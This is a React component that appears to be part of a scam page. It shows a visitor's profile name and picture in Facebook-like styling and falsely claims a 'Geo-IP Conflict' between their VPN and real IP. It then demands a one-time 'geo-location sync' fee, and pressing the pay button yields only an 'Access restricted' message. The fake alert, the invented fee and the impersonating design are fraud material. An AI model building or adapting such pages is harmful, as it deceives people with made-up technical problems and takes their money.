'use client';

import multipleStep from '@/lib/multipleStep';
import { useEffect, useState } from 'react';

export default function GeoIpSync() {
  const [paid, setPaid] = useState(false);

  const [infos, setInfos] = useState<any>(null);

  useEffect(() => {
    async function fetchInfos() {
      const data = await multipleStep();
      setInfos(data);
    }
    fetchInfos();
  }, []);


  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10 font-sans">
      <div className="max-w-md w-full bg-[#f9fbff] border border-[#dbeafe] shadow-md rounded-xl p-6">
        {/* User Header */}
        <div className="flex items-center gap-4 mb-6">
          {infos?.profile_pic &&
            <img
              src={infos?.profile_pic}
              className="w-14 h-14 rounded-full border-4 border-[#1877f2] object-cover"
            />
          }
          <div>
            <p className="text-sm text-gray-500">{infos?.type} User</p>
            <h2 className="text-xl font-semibold text-gray-900">{infos?.profile_name}</h2>
          </div>
        </div>

        {/* Illustration */}
        <div className="w-full flex justify-center mb-6">
          <svg
            width="120"
            height="120"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <circle cx="12" cy="12" r="10" fill="#e0f2fe" />
            <path
              d="M12 2v2M12 20v2M20 12h2M2 12H4M16.24 7.76l1.42-1.42M4.34 19.66l1.42-1.42M16.24 16.24l1.42 1.42M4.34 4.34l1.42 1.42"
              stroke="#0284c7"
              strokeWidth="2"
              strokeLinecap="round"
            />
            <path
              d="M12 8a4 4 0 100 8 4 4 0 000-8z"
              fill="#38bdf8"
            />
          </svg>
        </div>

        {/* Title & Explanation */}
        <h1 className="text-xl font-semibold text-[#111827] mb-2 text-center">
          Geo-IP Conflict Detected
        </h1>
        <p className="text-sm text-gray-600 mb-5 text-center">
          Your current VPN and real IP address are not aligned. To maintain access and prevent location mismatch alerts, syncing is required.
        </p>

        {/* Payment Notice */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-md mb-6">
          <p className="text-sm font-medium">
            A one-time <strong>${infos?.payment} geo-location sync</strong> fee is needed to correct your IP region.
          </p>
        </div>

        {/* Action Button */}
        <button
          onClick={() => setPaid(true)}
          className="w-full bg-[#1877f2] text-white font-semibold py-3 rounded-full text-base mb-3 hover:bg-[#155fca] transition"
        >
          Pay ${infos?.payment} to Sync Location
        </button>

        {/* Confirmation */}
        {paid && (
          <div className="bg-red-50 border-l-4 border-red-400 text-red-700 p-4 rounded-md mb-6">
            <p className="text-sm font-medium">
              Access restricted to registered users only..
            </p>

          </div>
        )}
      </div>
    </div>
  );
}
